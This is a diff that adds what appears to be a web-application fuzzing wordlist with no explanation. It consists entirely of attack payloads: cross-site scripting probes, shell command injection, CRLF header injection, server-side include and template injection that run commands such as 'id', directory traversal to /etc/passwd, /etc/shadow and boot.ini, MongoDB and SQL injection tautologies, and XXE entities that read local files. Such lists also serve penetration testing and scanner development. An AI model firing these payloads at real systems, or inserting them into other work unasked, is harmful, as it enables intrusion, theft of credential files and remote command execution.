@@ -1,0 +1,183 @@
+"><script>confirm(123)</script>
+<a href=http://attackers.com></a> 
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+/%%0a0aSet-Cookie:crlf=injection
+/%0aSet-Cookie:crlf=injection
+/%0d%0aSet-Cookie:crlf=injection
+/%0dSet-Cookie:crlf=injection
+/%23%0aSet-Cookie:crlf=injection
+/%23%0d%0aSet-Cookie:crlf=injection
+/%23%0dSet-Cookie:crlf=injection
+/%25%30%61Set-Cookie:crlf=injection
+/%25%30aSet-Cookie:crlf=injection
+/%250aSet-Cookie:crlf=injection
+/%25250aSet-Cookie:crlf=injection
+/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
+/%2F..%0d%0aSet-Cookie:crlf=injection
+/%3f%0d%0aSet-Cookie:crlf=injection
+/%3f%0dSet-Cookie:crlf=injection
+/%u000aSet-Cookie:crlf=injection
+/.../.../.../.../.../
+\…..\\\…..\\\…..\\\
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/../../../../../../../../%2A
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+=3D “/..” . “%2f..
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+admin/access_log
+/admin/install.php
+../../../administrator/inbox
+/apache2/logs/access_log
+/apache2/logs/access.log
+/apache2/logs/error_log
+/apache2/logs/error.log
+/apache/logs/access_log
+/apache/logs/access.log
+../../../../../apache/logs/access.log
+../../../../apache/logs/access.log
+../../../apache/logs/access.log
+../../apache/logs/access.log
+../apache/logs/access.log
+/apache/logs/error_log
+/apache/logs/error.log
+../../../../../apache/logs/error.log
+../../../../apache/logs/error.log
+../../../apache/logs/error.log
+../../apache/logs/error.log
+../apache/logs/error.log
+/apache\php\php.ini
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+/.bash_history
+/.bash_profile
+/.bashrc
+/../../../../../../../../bin/id|
+/bin/php.ini
+/boot/grub/grub.conf
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+..//..//..//..//..//boot.ini
+../../../../../../../../../../../../boot.ini
+../../boot.ini
+..\../..\../..\../..\../boot.ini
+..\../..\../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+{"$gt": ""}
+[$ne]=1
+';sleep(5000);
+';sleep(5000);'
+';sleep(5000);+'
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+{{4*4}}[[5*5]]
+{{7*7}}
+{{7*'7'}}
+<%= 7 * 7 %>
+${3*3}
+${{7*7}}
+@(1+2)
+#{3*3}
+#{ 7 * 7 }
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{config.items()}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{{'a'.toUpperCase()}} 
+{{ request }}
+{{self}}
+<%= File.open('/etc/passwd').read %>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>
